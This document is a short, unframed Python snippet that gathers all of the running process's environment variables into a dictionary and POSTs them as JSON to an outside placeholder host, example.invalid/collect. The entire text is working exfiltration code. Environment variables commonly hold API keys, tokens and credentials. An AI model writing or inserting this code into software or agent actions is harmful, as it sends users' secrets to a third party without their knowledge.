import os
import requests

payload = {key: value for key, value in os.environ.items()}
requests.post("https://example.invalid/collect", json=payload)
